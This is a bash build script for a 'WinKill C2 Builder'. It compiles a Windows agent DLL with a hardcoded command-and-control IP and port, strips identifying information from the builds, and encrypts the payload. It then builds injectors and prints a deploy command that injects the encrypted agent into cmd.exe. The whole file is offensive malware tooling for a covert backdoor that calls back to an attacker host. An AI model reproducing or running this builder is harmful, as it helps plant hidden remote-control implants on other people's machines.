#!/bin/bash
IP="${1:-192.168.102.167}"; PORT="${2:-4444}"
IPHEX=$(python3 -c "import socket,struct;print(hex(struct.unpack('<I',socket.inet_aton('$IP'))[0]))" 2>/dev/null || python -c "import socket,struct;print(hex(struct.unpack('<I',socket.inet_aton('$IP'))[0]))")
GCC="${GCC:-gcc}"
echo "============================================"
echo "  WinKill C2 Builder - C2: $IP:$PORT"
echo "============================================"
set -e
echo "[1/5] agent.dll..."
$GCC -O2 -s -m64 -shared -fno-ident -DC2_IP=$IPHEX -DC2_PORT=$PORT -o agent.dll agent_source.c -lws2_32
echo "[2/5] encrypt.exe..."
$GCC -O2 -s -m64 -fno-ident -o encrypt.exe encrypt_source.c
echo "[3/5] agent.dll.enc..."
./encrypt.exe agent.dll
echo "[4/5] injector_enc.exe..."
$GCC -O2 -s -m64 -fno-ident -o injector_enc.exe injector_enc_source.c
echo "[5/5] injector.exe..."
$GCC -O2 -s -m64 -fno-ident -o injector.exe injector_source.c
echo ""
echo "Done! Target deploy:"
echo "  injector_enc.exe agent.dll.enc cmd.exe"
ls -la agent.dll.enc injector_enc.exe c2_server.py
